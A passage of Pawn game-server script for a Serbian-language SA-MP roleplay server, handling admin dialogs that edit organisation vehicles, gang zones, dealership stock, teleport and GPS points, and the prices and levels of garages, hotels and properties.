                    ShowPlayerDialog(playerid, dialog_OrgVehEditKolicina, DIALOG_STYLE_LIST, "Org Veh Edit Kolicina", VehString, "Potvrdi", "Odustani");

                    return 1;
                }
                case 3: {

                    ShowPlayerDialog(playerid, dialog_OrgVehEditSpawn, DIALOG_STYLE_INPUT, "Promena Spawn Pointa", "Unesite ID Org Veh Pickup-a na koji zelite postaviti spawn point", "Potvrdi", "Odustani");

                    return 1;
                }
                case 4: {

                    SPD(playerid, dialog_IzmeniOrgVehPickupColor, DIALOG_STYLE_LIST, "Odaberi boju vozila", "Crna\nBela\nCrvena\nZuta\nRoze\nPlava\nLjubicasta\nZelena\nSvetlo Plava", "Odaberi", "Odustani");

                    return 1;
                }
            }
        }
    }

    else if(dialogid == dialog_IzmeniOrgVehPickupColor) {

        if(!response) return 0;
        if(response) {

            new id = NajbliziIDOrgVeh(playerid);
            if(id == -1) return SendErrorMessage(playerid, "Nisi blizu nijednog Org Veh Pickup-a!");

            switch(listitem) {

                case 0: { OrgVehInfo[id][oVehColor] = 0; }
                case 1: { OrgVehInfo[id][oVehColor] = 1; }
                case 2: { OrgVehInfo[id][oVehColor] = 3; }
                case 3: { OrgVehInfo[id][oVehColor] = 6; }
                case 4: { OrgVehInfo[id][oVehColor] = 136; }
                case 5: { OrgVehInfo[id][oVehColor] = 152; }
                case 6: { OrgVehInfo[id][oVehColor] = 233; }
                case 7: { OrgVehInfo[id][oVehColor] = 128; }
                case 8: { OrgVehInfo[id][oVehColor] = 135; }
            }

            SacuvajOrgVehPickup(id);

            SendInfoMessage(playerid, "Uspesno si promenio boju vozila!");

            return 1;
        }

        return 1;
    }

    else if(dialogid == dialog_OrgVehEditKolicina_2) {

        if(!response) return 0;
        if(response) {

            new id = NajbliziIDOrgVeh(playerid);
            if(id == -1) return SendErrorMessage(playerid, "Nisi blizu nijednog Org Veh Pickup-a!");

            new kolicina;
            if(sscanf(inputtext, "d", kolicina)) return ShowPlayerDialog(playerid, dialog_OrgVehEditModel_2, DIALOG_STYLE_INPUT, "Org Veh Edit Kolicina", "Unesite novu kolicinu", "Potvrdi", "Odustani");

            if( kolicina < 1 || kolicina > 100 ) return SendErrorMessage( playerid, "Kolicina ne moze biti manja od 1 ili veca od 100!");

            new br = ModelOdabir[playerid];

            if(br < 0 || br > 4) return SendErrorMessage(playerid, "Desila se greska!");

            switch(br) {

                case 0: OrgVehInfo[id][oVehKolicina1] = kolicina;
                case 1: OrgVehInfo[id][oVehKolicina2] = kolicina;
                case 2: OrgVehInfo[id][oVehKolicina3] = kolicina;
                case 3: OrgVehInfo[id][oVehKolicina4] = kolicina;
                case 4: OrgVehInfo[id][oVehKolicina5] = kolicina;
            }
            
            SacuvajOrgVehPickup(id);

            SendInfoMessage(playerid, "Uspesno si postavio novu kolicinu!");

            return 1;
        }
    }

    else if(dialogid == dialog_OrgVehEditKolicina) {

        if(!response) return 0;
        if(response) {

            new id = NajbliziIDOrgVeh(playerid);
            if(id == -1) return SendErrorMessage(playerid, "Nisi blizu nijednog Org Veh Pickup-a!");

            ModelOdabir[playerid] = listitem;

            ShowPlayerDialog(playerid, dialog_OrgVehEditKolicina_2, DIALOG_STYLE_INPUT, "Org Veh Edit Kolicina", "Unesite novu kolicinu", "Potvrdi", "Odustani");

            return 1;
        }
    } 

    else if(dialogid == dialog_OrgVehEditModel_2) {

        if(!response) return 0;
        if(response) {

            new id = NajbliziIDOrgVeh(playerid);
            if(id == -1) return SendErrorMessage(playerid, "Nisi blizu nijednog Org Veh Pickup-a!");

            new model;
            if(sscanf(inputtext, "d", model)) return ShowPlayerDialog(playerid, dialog_OrgVehEditModel_2, DIALOG_STYLE_INPUT, "Org Veh Edit Model", "Unesite novi model", "Potvrdi", "Odustani");

            if( model < 400 || model > 611 ) return SendErrorMessage( playerid, "ID vozila ne moze biti manji od 400 ili veci od 611!");

            new br = ModelOdabir[playerid];

            if(br < 0 || br > 4) return SendErrorMessage(playerid, "Desila se greska!");

            switch(br) {

                case 0: OrgVehInfo[id][oVehModel1] = model;
                case 1: OrgVehInfo[id][oVehModel2] = model;
                case 2: OrgVehInfo[id][oVehModel3] = model;
                case 3: OrgVehInfo[id][oVehModel4] = model;
                case 4: OrgVehInfo[id][oVehModel5] = model;
            }
            
            SacuvajOrgVehPickup(id);

            SendInfoMessage(playerid, "Uspesno si postavio novi model!");

            return 1;
        }
    }

    else if(dialogid == dialog_OrgVehEditModel) {

        if(!response) return 0;
        if(response) {

            new id = NajbliziIDOrgVeh(playerid);
            if(id == -1) return SendErrorMessage(playerid, "Nisi blizu nijednog Org Veh Pickup-a!");

            ModelOdabir[playerid] = listitem;

            ShowPlayerDialog(playerid, dialog_OrgVehEditModel_2, DIALOG_STYLE_INPUT, "Org Veh Edit Model", "Unesite novi model", "Potvrdi", "Odustani");

            return 1;
        }
    } 

    else if(dialogid == dialog_OrgVehEditOwner) {

        if(!response) return 0;
        if(response) {

            new id = NajbliziIDOrgVeh(playerid);
            if(id == -1) return SendErrorMessage(playerid, "Nisi blizu nijednog Org Veh Pickup-a!");

            new orgID;
            if(sscanf(inputtext, "d", orgID)) return ShowPlayerDialog(playerid, dialog_OrgVehEditOwner, DIALOG_STYLE_INPUT, "Promena Vlasnistva", "Unesite ID organizacije koja ce biti novi vlasnik", "Potvrdi", "Odustani");

            new fFile[80];
            format(fFile, 80, O_FILE, orgID);
            if(!fexist(fFile)) return SendErrorMessage(playerid, "Taj organizacija ne postoji!");

            OrgVehInfo[id][oVehOrgID] = orgID;
            SacuvajOrgVehPickup(id);

            OrgVehPickupLabel(id);

            SendInfoMessage(playerid, "Uspesno si promenio vlasnika na %s!", getOrgName(orgID));

            return 1;
        }

        return 1;
    }

    else if(dialogid == dialog_OrgVehEditSpawn) {

        if(!response) return 0;
        if(response) {

            new id;
            if(sscanf(inputtext, "d", id)) return ShowPlayerDialog(playerid, dialog_OrgVehEditSpawn, DIALOG_STYLE_INPUT, "Promena Spawn Pointa", "Unesite ID Org Veh Pickup-a na koji zelite postaviti spawn point", "Potvrdi", "Odustani");

            new fFile[80];
            format(fFile, 80, ORGVEH_FILE, id);
            if(!fexist(fFile)) return SendErrorMessage(playerid, "Taj Org Veh Pickup ne postoji!");

            new Float:Coor[3];
            GetPlayerPos(playerid, Coor[0], Coor[1], Coor[2]);

            OrgVehInfo[id][oVehSpawnX] = Coor[0];
            OrgVehInfo[id][oVehSpawnY] = Coor[1];
            OrgVehInfo[id][oVehSpawnZ] = Coor[2];

            SacuvajOrgVehPickup(id);

            SendInfoMessage(playerid, "Uspesno si stavio Spawn Point za Org Veh Pickup!");

            return 1;
        }
    }

	else if( dialogid == dialog_GANGZID ) {

	    if( !response ) return true;
        if( response ) {
        
            new organizacija, ImaFajl[ 50 ];
				
            if( sscanf( inputtext, "i", organizacija ) ) return SPD( playerid, dialog_GANGZID, DSI, D_NASLOV, "Unesi ID orge kojoj dajete vlasnistvo.", D_ODABERI, D_ODUSTANI );

			format( ImaFajl, sizeof( ImaFajl ), O_FILE, organizacija );
			if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );
        
            new gZone__ID = GetNearestGZone( playerid );
			if( gZone__ID == -1 ) return SendErrorMessage( playerid, "Moras biti pored teritorije." );

   	        gZoneInfo[ gZone__ID ][ gZoneGangID ] = organizacija;
			gZoneInfo[ gZone__ID ][ gZoneTaken ] = true;

			GZone_Refresh( gZone__ID );

			GZone_Save( gZone__ID );
			
			SendInfoMessage( playerid, "Ova zona je sad u vlasnistvu organizacije ID %d.", organizacija );
        }
	}
	else if( dialogid == dialog_GANGZCOLOREDIT ) {

	    if( !response ) return true;
        if( response ) {

            new color[24], stringic[24];
            if( sscanf( inputtext, "s[24]", color ) ) return SPD( playerid, dialog_GANGZCOLOREDIT, DSI, D_NASLOV, "Unesite boju za gang zonu.\nPrimer: FF2244", D_ODABERI, D_NAZAD );

            new gZone__ID = GetNearestGZone( playerid );
			if( gZone__ID == -1 ) return SendErrorMessage( playerid, "Moras biti pored teritorije." );

            format( stringic, sizeof( stringic ), "%s", color );
            strmid( gZoneInfo[ gZone__ID ][ gZoneColor ], stringic, 0, strlen( stringic ), 255 );

            GangZoneHideForAll( gZoneInfo[ gZone__ID ][ gZoneID ] );
            
  			format( stringic, sizeof( stringic ), "0x%s66", gZoneInfo[ gZone__ID ][ gZoneColor ] );
            GangZoneShowForAll( gZoneInfo[ gZone__ID ][ gZoneID ], HexToInt( stringic ) );

            GZone_Save( gZone__ID );

		    SendInfoMessage( playerid, "Uneo si boju." );

        }
	}
	else if( dialogid == dialog_GANGZEDIT ) {
	
	    if( !response ) return true;
        if( response ) {
        
            if( listitem == 0 ) {
            
                new gZone__ID = GetNearestGZone( playerid );
				if( gZone__ID == -1 ) return SendErrorMessage( playerid, "Moras biti pored teritorije." );
                SPD( playerid, dialog_GANGZID, DSI, D_NASLOV, "Unesi ID orge kojoj dajete vlasnistvo.", D_ODABERI, D_ODUSTANI );
            }
            if( listitem == 1 ) {

                new gZone__ID = GetNearestGZone( playerid );
				if( gZone__ID == -1 ) return SendErrorMessage( playerid, "Moras biti pored teritorije." );
				if( !gZoneInfo[ gZone__ID ][ gZoneTakeable ] ) {
				
				    gZoneInfo[ gZone__ID ][ gZoneTakeable ] = true;
				    SendInfoMessage( playerid, "Postavio si zonu ID - %d, da moze da se zauzima.", gZone__ID );
				    GZone_Save( gZone__ID );
				}
				else if( gZoneInfo[ gZone__ID ][ gZoneTakeable ] ) {

				    gZoneInfo[ gZone__ID ][ gZoneTakeable ] = false;
				    SendInfoMessage( playerid, "Postavio si zonu ID - %d, da ne moze da se zauzima.", gZone__ID );
                    GZone_Save( gZone__ID );
				}
            }
            if( listitem == 2 ) {
            
                new gZone__ID = GetNearestGZone( playerid );
				if( gZone__ID == -1 ) return SendErrorMessage( playerid, "Moras biti pored teritorije." );

	   	        gZoneInfo[ gZone__ID ][ gZoneGangID ] = -1;
				gZoneInfo[ gZone__ID ][ gZoneTaken ] = false;

				GZone_Refresh( gZone__ID );

				GZone_Save( gZone__ID );
				
				SendInfoMessage( playerid, "Ova zona je sad slobodna." );
            
			}
            if( listitem == 3 ) {
            
                SPD( playerid, dialog_GANGZCOLOREDIT, DSI, D_NASLOV, "Unesite boju za gang zonu.\nPrimer: FF2244", D_ODABERI, D_NAZAD );
            }
            if(listitem == 4) {

                
            }
		}
	}
	else if( dialogid == dialog_AUTOSEDIT ) {
	    if( !response ) return true;
        if( response ) {
            if( listitem ==  0 ) {
                new as = GetNearestSalon( playerid );
            	if( as == -1 ) return SendErrorMessage( playerid, "Moras biti pored pickupa za kupovinu u salonu." );

				new coordsstring[ 64 ];
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
				strcat( DialogStrgEx, "Unesite za broj modela vozila i kolicinu.\nPrimer: 1 4\n" );
				strcat( DialogStrgEx, "Kolicina ne moze ici ispod 1.Kolicina koju unesete dodaje se sa postojecom\n\n" );
				for( new i = 0; i < AutoSalon[ as ][ aMaxVehModel ]; i++ ) {
				    if( AutoSalon[ as ][ aVehModel ][ i ] != 0 ) {
				        format( coordsstring, sizeof( coordsstring ), "Model %d - %s - %d komada\n", (i+1), ImeVozila[ (AutoSalon[ as ][ aVehModel ][ i ]- 400) ], AutoSalon[ as ][ aVehAmmount ][ i ] );
						strcat( DialogStrgEx, coordsstring );
				    }
				}
				SPD( playerid, dialog_ASEDITAMMOUNT, DSI, D_NASLOV, DialogStrgEx, D_ODABERI, D_NAZAD );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
            }
        }
	}
	else if( dialogid == dialog_ASEDITAMMOUNT ) {
	    if( !response ) return true;
        if( response ) {
            new as = GetNearestSalon( playerid ), model, kolicina, model2;
           	if( as == -1 ) return SendErrorMessage( playerid, "Moras biti pored pickupa za kupovinu u salonu." );

			if( sscanf( inputtext, "dd", model, kolicina ) ) {
			
                new coordsstring[ 64 ];
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
				strcat( DialogStrgEx, "Unesite za broj modela vozila i kolicinu.\nPrimer: 1 4\n" );
				strcat( DialogStrgEx, "Kolicina ne moze ici ispod 1.Kolicina koju unesete dodaje se sa postojecom\n\n" );
				for( new i = 0; i < AutoSalon[ as ][ aMaxVehModel ]; i++ ) {
				    if( AutoSalon[ as ][ aVehModel ][ i ] != 0 ) {
				        format( coordsstring, sizeof( coordsstring ), "Model %d - %s - %d komada\n", (i+1), ImeVozila[ (AutoSalon[ as ][ aVehModel ][ i ]- 400) ], AutoSalon[ as ][ aVehAmmount ][ i ] );
						strcat( DialogStrgEx, coordsstring );
				    }
				}
				SPD( playerid, dialog_ASEDITAMMOUNT, DSI, D_NASLOV, DialogStrgEx, D_ODABERI, D_NAZAD );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
                return 1;
            }
            if( kolicina < 1 ) return SendErrorMessage( playerid, "Kolicina ne moze ici ispod 1." );
            if( model < 1 ) return SendErrorMessage( playerid, "Model ne moze ici ispod 1." );
            if( model > AutoSalon[ as ][ aMaxVehModel ] ) return SendErrorMessage( playerid, "Uneli ste broj nepostojeceg modela." );
			model2 = model-1;
			
			AutoSalon[ as ][ aVehAmmount ][ model2 ] += kolicina;
			SaveSalon( as );
			SendInfoMessage( playerid, "Dodao si jos %d %s koja mogu da se kupe.", kolicina, ImeVozila[ (AutoSalon[ as ][ aVehModel ][ model2 ]- 400) ] );
        }
	}
	else if( dialogid == dialog_SPORTEDIT ) {
	    if( !response ) return true;
        if( response ) {
            if( listitem ==  0 ) {
                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
			    for( new i = 0; i < MAX_SPORTS; i++ ) {
					if( supportInfo[ i ][ supportCreated ] == 1 ) {
				    	format( DialogStrgEx, sizeof( DialogStrgEx ), "%s%s\n", DialogStrgEx, supportInfo[ i ][ supportName ] );
					}
				}
				SPD( playerid, dialog_IZMENAIMENASPORT, DSL, "Izaberi sport", DialogStrgEx, D_ODABERI, D_ODUSTANI );
            }
            if( listitem ==  1 ) {
                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
			    for( new i = 0; i < MAX_SPORTS; i++ ) {
					if( supportInfo[ i ][ supportCreated ] == 1 ) {
				    	format( DialogStrgEx, sizeof( DialogStrgEx ), "%s%s\n", DialogStrgEx, supportInfo[ i ][ supportName ] );
					}
				}
				SPD( playerid, dialog_IZMENAPOZSPORT, DSL, "Izaberi sport", DialogStrgEx, D_ODABERI, D_ODUSTANI );
            }
		}
	}
	else if( dialogid == dialog_IZMENAIMENASPORT ) {
	    if( !response ) return true;
        if( response ) {
            gpsid[ playerid ] = listitem;
            SPD( playerid, dialog_IZMENAIMENASPORT2, DSI, D_NASLOV, "Unesite novo ime izabranog support porta.", D_ODABERI, D_ODUSTANI );
        }
	}
	else if( dialogid == dialog_IZMENAIMENASPORT2 ) {
	    if( !response ) return true;
        if( response ) {
            new aportname[ 50 ];
            if( sscanf( inputtext, "s[50]", aportname ) ) return SPD( playerid, dialog_IZMENAIMENASPORT2, DSI, D_NASLOV, "Unesite novo ime izabranog support porta.", D_ODABERI, D_ODUSTANI );
            if( gpsid[ playerid ] == -1 ) return SendErrorMessage( playerid, "Nemas izabranu support port lokaciju." );
			new id = gpsid[ playerid ];

			strmid( supportInfo[ id ][ supportName ], aportname, 0, strlen( aportname ), 50 );
			SaveSports( );

			SendInfoMessage( playerid, "Uspesno si promenio ime Admin TEAM porta u '%s'.", aportname );
			gpsid[ playerid ] = -1;
        }
	}
	else if( dialogid == dialog_IZMENAPOZSPORT ) {
	    if( !response ) return true;
        if( response ) {
            new IDaport = listitem, Float:Pos[ 3 ];

            GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

            supportInfo[ IDaport ][ supportPos ][ 0 ] = Pos[ 0 ];
            supportInfo[ IDaport ][ supportPos ][ 1 ] = Pos[ 1 ];
            supportInfo[ IDaport ][ supportPos ][ 2 ] = Pos[ 2 ];

			SaveAports( );

			SendInfoMessage( playerid, "Uspesno si promenio poziciju support porta '%s' na tvoju poziciju.", supportInfo[ IDaport ][ supportName ] );
        }
	}
	else if( dialogid == dialog_APORTEDIT ) {
	    if( !response ) return true;
        if( response ) {
            if( listitem ==  0 ) {
                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
			    for( new i = 0; i < MAX_APORTS; i++ ) {
					if( aportInfo[ i ][ aportCreated ] == 1 ) {
				    	format( DialogStrgEx, sizeof( DialogStrgEx ), "%s%s\n", DialogStrgEx, aportInfo[ i ][ aportName ] );
					}
				}
				SPD( playerid, dialog_IZMENAIMENAAPORT, DSL, "Izaberi aport", DialogStrgEx, D_ODABERI, D_ODUSTANI );
            }
            if( listitem ==  1 ) {
                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
			    for( new i = 0; i < MAX_APORTS; i++ ) {
					if( aportInfo[ i ][ aportCreated ] == 1 ) {
				    	format( DialogStrgEx, sizeof( DialogStrgEx ), "%s%s\n", DialogStrgEx, aportInfo[ i ][ aportName ] );
					}
				}
				SPD( playerid, dialog_IZMENAPOZAPORT, DSL, "Izaberi aport", DialogStrgEx, D_ODABERI, D_ODUSTANI );
            }
		}
	}
	else if( dialogid == dialog_IZMENAIMENAAPORT ) {
	    if( !response ) return true;
        if( response ) {
            gpsid[ playerid ] = listitem;
            SPD( playerid, dialog_IZMENAIMENAAPORT2, DSI, D_NASLOV, "Unesite novo ime izabranog Admin TEAM porta.", D_ODABERI, D_ODUSTANI );
        }
	}
	else if( dialogid == dialog_IZMENAIMENAAPORT2 ) {
	    if( !response ) return true;
        if( response ) {
            new aportname[ 50 ];
            if( sscanf( inputtext, "s[50]", aportname ) ) return SPD( playerid, dialog_IZMENAIMENAAPORT2, DSI, D_NASLOV, "Unesite novo ime izabranog Admin TEAM porta.", D_ODABERI, D_ODUSTANI );
            if( gpsid[ playerid ] == -1 ) return SendErrorMessage( playerid, "Nemas izabran Admin TEAM port lokaciju." );
			new id = gpsid[ playerid ];
			
			strmid( aportInfo[ id ][ aportName ], aportname, 0, strlen( aportname ), 50 );
			SaveAports( );

			SendInfoMessage( playerid, "Uspesno si promenio ime Admin TEAM porta u '%s'.", aportname );
			gpsid[ playerid ] = -1;
        }
	}
	else if( dialogid == dialog_IZMENAPOZAPORT ) {
	    if( !response ) return true;
        if( response ) {
            new IDaport = listitem, Float:Pos[ 3 ];

            GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

            aportInfo[ IDaport ][ aportPos ][ 0 ] = Pos[ 0 ];
            aportInfo[ IDaport ][ aportPos ][ 1 ] = Pos[ 1 ];
            aportInfo[ IDaport ][ aportPos ][ 2 ] = Pos[ 2 ];

			SaveAports( );

			SendInfoMessage( playerid, "Uspesno si promenio poziciju Admin TEAM porta '%s' na tvoju poziciju.", aportInfo[ IDaport ][ aportName ] );
        }
	}
	else if( dialogid == dialog_GPSEDIT ) {
	    if( !response ) return true;
        if( response ) {
            if( listitem ==  0 ) {
                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
			    for( new i = 1; i < MAX_GPS; i++ ) {
		            new filename[ 60 ];
					format( filename, sizeof( filename ), F_GPS, i );
					if( fexist( filename ) ) {
				    	format( DialogStrgEx, sizeof( DialogStrgEx ), "%s%s\n", DialogStrgEx, gpsInfo[ i ][ gpsName ] );
					}
				}
				SPD( playerid, dialog_IZMENAIMENAGPS, DSL, "Izaberi GPS", DialogStrgEx, D_ODABERI, D_ODUSTANI );
            }
            if( listitem ==  1 ) {
                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
			    for( new i = 1; i < MAX_GPS; i++ ) {
		            new filename[ 60 ];
					format( filename, sizeof( filename ), F_GPS, i );
					if( fexist( filename ) ) {
				    	format( DialogStrgEx, sizeof( DialogStrgEx ), "%s%s\n", DialogStrgEx, gpsInfo[ i ][ gpsName ] );
					}
				}
				SPD( playerid, dialog_IZMENAPOZGPS, DSL, "Izaberi GPS", DialogStrgEx, D_ODABERI, D_ODUSTANI );
            }
		} 
	}
	else if( dialogid == dialog_IZMENAIMENAGPS ) {
	    if( !response ) return true;
        if( response ) {
            gpsid[ playerid ] = listitem+1;
            SPD( playerid, dialog_IZMENAIMENAGPS2, DSI, D_NASLOV, "Unesite novo ime gps lokacije", D_ODABERI, D_ODUSTANI );
        }
	}
	else if( dialogid == dialog_IZMENAIMENAGPS2 ) {
	    if( !response ) return true;
        if( response ) {
            new gpsname[ 50 ];
            if( sscanf( inputtext, "s[50]", gpsname ) ) return SPD( playerid, dialog_IZMENAIMENAGPS2, DSI, D_NASLOV, "Unesite novo ime gps lokacije", D_ODABERI, D_ODUSTANI );
            if( gpsid[ playerid ] == -1 ) return SendErrorMessage( playerid, "Nemas izabranu gps lokaciju." );
            new filename[ 60 ];
			format( filename, sizeof( filename ), F_GPS, gpsid[ playerid ] );
			if( !fexist( filename ) ) return SendErrorMessage( playerid, "Izabrana GPS lokacija ne postoji u bazi podataka." );
			
			strmid( gpsInfo[ gpsid[ playerid ] ][ gpsName ], gpsname, 0, strlen( gpsname ), 50 );
			GPS_Save( gpsid[ playerid ] );
			
			SendInfoMessage( playerid, "Uspesno si promenio ime GPS lokacije u '%s'.", gpsname );
			gpsid[ playerid ] = -1;
        }
	}
	else if( dialogid == dialog_IZMENAPOZGPS ) {
	    if( !response ) return true;
        if( response ) {
            new IDgps = listitem+1, Float:Pos[ 3 ];
            
            GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
            
            gpsInfo[ IDgps ][ gpsPos ][ 0 ] = Pos[ 0 ];
            gpsInfo[ IDgps ][ gpsPos ][ 1 ] = Pos[ 1 ];
            gpsInfo[ IDgps ][ gpsPos ][ 2 ] = Pos[ 2 ];
            
			GPS_Save( IDgps );
			
			SendInfoMessage( playerid, "Uspesno si promenio poziciju GPS lokacije '%s' na tvoju poziciju.", gpsInfo[ IDgps ][ gpsName ] );
        }
	}
	else if( dialogid == dialog_GEDIT ) {
	    if( !response ) return true;
        if( response ) {
            if( listitem ==  0 ) {
		        SPD( playerid, dialog_GEPRICE, DSI, D_NASLOV, "Unesite zeljenu cenu garaze!", D_ODABERI, D_ODUSTANI );
		    }
		    if( listitem ==  1 ) {
		        SPD( playerid, dialog_GELEVEL, DSI, D_NASLOV, "Unesite zeljeni level garaze!", D_ODABERI, D_ODUSTANI );
		    }
		    if( listitem ==  2 ) {
				new id = GetNearestGarage( playerid );
	   	 		if( GetNearestGarage( playerid ) == -1 ) return SendErrorMessage( playerid, "Nema garaze u blizini!");

	            new string1[ 128 ]; 
				format( string1, sizeof( string1 ), "Admin TEAM %s je prodao garazu ID %d na buy", ImeIgraca( playerid ), id );
				LogSave( "Ostalo/LogEdit.log", string1 );

				garageInfo[ id ][ garageOwned ] = false;
	    		strmid( garageInfo[ id ][ garageOwner ], "Drzava", 0, strlen( "Drzava" ), 24 );
	    		Garage_Save( id );
	    		SendInfoMessage( playerid, "Garaza uspesno prodana!" );
	    		Garage_Refresh( id );
		    }
        }
	}
	else if( dialogid == dialog_GEPRICE && response ) {
	    new cena, garaza = GetNearestGarage( playerid );
		if( GetNearestGarage( playerid ) == -1 ) return SendErrorMessage( playerid, "Nema garaze u vasoj blizini!" );
		if( garageInfo[ garaza ][ garageOwned ] == true ) return SendErrorMessage( playerid, "Ne mozes da izmenis cenu kupljene garaze." );
		if( sscanf( inputtext, "d", cena ) ) return SPD( playerid, dialog_GEPRICE, DSI, D_NASLOV, "Unesite zeljenu cenu garaze!", D_ODABERI, D_ODUSTANI );
		garageInfo[ garaza ][ garagePrice ] = cena; Garage_Save( garaza ); Garage_Refresh( garaza );
		SendInfoMessage( playerid, "Promenili ste cenu garaze. ID = %d | Cena = %d.", garaza, cena );
        new string[ 128 ]; 
		format( string, sizeof( string ), "Admin TEAM %s je promenio cenu garaze(ID:%d) u %d", ImeIgraca( playerid ), garaza, cena );
		LogSave( "Ostalo/LogEdit.log", string );
	}
	else if( dialogid == dialog_GELEVEL && response ) {
	    new level, garaza = GetNearestGarage( playerid );
		if( GetNearestGarage( playerid ) == -1 ) return SendErrorMessage( playerid, "Nema garaze u vasoj blizini!" );
		if( garageInfo[ garaza ][ garageOwned ] == true ) return SendErrorMessage( playerid, "Ne mozes da izmenis level kupljene garaze." );
		if( sscanf( inputtext, "d", level ) ) return SPD( playerid, dialog_GELEVEL, DSI, D_NASLOV, "Unesite zeljeni level garaze!", D_ODABERI, D_ODUSTANI );
		garageInfo[ garaza ][ garageLevel ] = level; Garage_Save( garaza ); Garage_Refresh( garaza );
		SendInfoMessage( playerid, "Promenili ste level garaze ID = %d | Level = %d.", garaza, level );
        new string[ 128 ]; 
		format( string, sizeof( string ), "Admin TEAM %s je promenio level garaze(ID:%d) u %d", ImeIgraca( playerid ), garaza, level );
		LogSave( "Ostalo/LogEdit.log", string );
	}
	else if( dialogid == dialog_HEDIT ) {
	    if( !response ) return true;
        if( response ) {
		    if( listitem ==  0 ) {
		        SPD( playerid, dialog_HEPRICE, DSI, D_NASLOV, "Unesite zeljenu cenu hotela!", D_ODABERI, D_ODUSTANI );
		    }
		    if( listitem ==  1 ) {
		        SPD( playerid, dialog_HELEVEL, DSI, D_NASLOV, "Unesite zeljeni level hotela!", D_ODABERI, D_ODUSTANI );
		    }
		    if( listitem ==  2 ) {
				new id = GetNearestHotel( playerid );
	   	 		if( GetNearestHotel( playerid ) == -1 ) return SendErrorMessage( playerid, "Nema hotela u blizini!");

	            new string1[ 128 ]; 
				format( string1, sizeof( string1 ), "Admin %s je prodao hotel ID %d na buy", ImeIgraca( playerid ), id );
				LogSave( "Ostalo/LogEdit.log", string1 );

				hotelInfo[ id ][ hOwned ] = 0;
	    		strmid( hotelInfo[ id ][ hOwner ], "Drzava", 0, strlen( "Drzava" ), 24 );
	    		hotelInfo[ id ][ hLocked ] = 0;
	    		SaveHotel( id );
	    		SendInfoMessage( playerid, "Hotel uspesno prodaa!" );
	    		HotelRefresh( id );
		    }
        }
	}
	else if( dialogid == dialog_HEPRICE && response ) {
	    new cena, hotel = GetNearestHotel( playerid );
		if( GetNearestHotel( playerid ) == -1 ) return SendErrorMessage( playerid, "Nema hotela u vasoj blizini!" );
		if( hotelInfo[ hotel ][ hOwned ] == 1 ) return SendErrorMessage( playerid, "Ne mozes da izmenis cenu kupljenog hotela." );
		if( sscanf( inputtext, "d", cena ) ) return SPD( playerid, dialog_HEPRICE, DSI, D_NASLOV, "Unesite zeljenu cenu hotela!", D_ODABERI, D_ODUSTANI );
		hotelInfo[ hotel ][ hPrice ] = cena; SaveHotel( hotel ); HotelRefresh( hotel );
		SendClientMessageEx( playerid, ZUTA, "Promenili ste cenu hotel. ID = %d | Cena = %d.", hotel, cena );
        new string[ 128 ];
		format( string, sizeof( string ), "Admin %s je promenio cenu hotela(ID:%d) u %d", ImeIgraca( playerid ), hotel, cena );
		LogSave( "Ostalo/LogEdit.log", string );
	}
	else if( dialogid == dialog_HELEVEL && response ) {
	    new level, hotel = GetNearestHotel( playerid );
		if( GetNearestHotel( playerid ) == -1 ) return SendErrorMessage( playerid, "Nema hotela u vasoj blizini!" );
		if( hotelInfo[ hotel ][ hOwned ] == 1 ) return SendErrorMessage( playerid, "Ne mozes da izmenis level kupljenog hotela." );
		if( sscanf( inputtext, "d", level ) ) return SPD( playerid, dialog_HELEVEL, DSI, D_NASLOV, "Unesite zeljeni level hotela!", D_ODABERI, D_ODUSTANI );
		hotelInfo[ hotel ][ hLevel ] = level; SaveHotel( hotel ); HotelRefresh( hotel );
		SendClientMessageEx( playerid, ZUTA, "Promenili ste level hotela ID = %d | Level = %d.", hotel, level );
        new string[ 128 ]; 
		format( string, sizeof( string ), "Admin %s je promenio level hotela(ID:%d) u %d", ImeIgraca( playerid ), hotel, level );
		LogSave( "Ostalo/LogEdit.log", string );
	}
	else if( dialogid == dialog_IEDIT ) {
	    if( !response ) return true;
        if( response ) {
		    if( listitem ==  0 ) {
		        SPD( playerid, dialog_ICPRICE, DSI, D_NASLOV, "Unesite zeljenu cenu imovine!", D_ODABERI, D_ODUSTANI );
		    }
		    if( listitem ==  1 ) {
		        SPD( playerid, dialog_IOPEN, DSI, D_NASLOV, "Unesite id imovine koju zelite otkljucati.", D_ODABERI, D_ODUSTANI ); }
		    if( listitem ==  2 ) {
		        SPD( playerid, dialog_ICLOSE, DSI, D_NASLOV, "Unesite id imovine koju zelite zakljucati.", D_ODABERI, D_ODUSTANI ); }
		    if( listitem ==  3 ) {
		        if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju.");
		        SPD( playerid, dialog_ISELL, DSI, D_NASLOV, "Unesti id imovine koju zelite prodati", D_ODABERI, D_ODUSTANI );
			}
		}
	}
	else if( dialogid == dialog_ICPRICE && response ) {
	    new cena, imovina = GetNearestProperty( playerid );
		if( GetNearestProperty( playerid ) == -1 ) return SendErrorMessage( playerid, "Nema imovine u vasoj blizini!" );
		if( II[ imovina ][ iOwned ] == 1 ) return SendErrorMessage( playerid, "Ne mozes da izmenis cenu kupljene kuce." );
		if( sscanf( inputtext, "d", cena ) ) return SPD( playerid, dialog_ICPRICE, DSI, D_NASLOV, "Unesite zeljenu cenu imovine!", D_ODABERI, D_ODUSTANI );
		II[ imovina ][ iPrice ] = cena; SaveProperty( imovina ); PropertyRefresh( imovina );
		SendClientMessageEx( playerid, ZUTA, "Promenili ste cenu imovine. ID = %d | Cena = %d.", imovina, cena );
        new string[ 128 ]; 
